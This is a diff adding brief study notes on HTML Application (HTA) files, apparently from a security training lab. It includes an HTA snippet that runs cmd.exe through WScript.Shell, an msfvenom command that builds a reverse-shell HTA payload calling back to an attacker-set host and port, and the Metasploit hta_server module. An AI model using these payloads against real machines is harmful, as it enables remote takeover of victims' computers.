@@ -1,0 +1,25 @@
+
+	## Notes
+	- HTA stands for “HTML Application.”
+	- Which are dynamic HTML pages containing JScript and VBScript
+	- Files sefed with extension .hta
+
+	## Code Examples ##
+
+		# Exec CMD
+		```
+		<html>
+		<body>
+		<script>
+			var c= 'cmd.exe'
+			new ActiveXObject('WScript.Shell').Run(c);
+		</script>
+		</body>
+		</html>
+		```
+
+		# msfvenom payload reverse shell
+		- msfvenom -p windows/x64/shell_reverse_tcp LHOST=[localIP] LPORT=[localPORT] -f hta-psh -o thm.hta
+
+		# Full metasploit Malicious Web
+		- use exploit/windows/misc/hta_server
